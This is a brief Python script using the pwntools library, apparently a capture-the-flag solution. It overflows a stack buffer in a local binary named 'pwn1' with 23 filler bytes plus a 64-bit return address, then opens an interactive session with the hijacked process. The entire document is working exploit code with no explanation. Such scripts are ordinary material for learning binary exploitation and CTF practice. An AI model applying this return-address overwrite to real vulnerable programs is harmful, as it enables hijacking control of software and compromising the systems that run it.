from pwn import *
serv = process('./pwn1')

offset = b'A'*23

offset += p64(0x0000000000401186)
print(offset)
print(serv.recv())

serv.sendline(offset)
serv.interactive()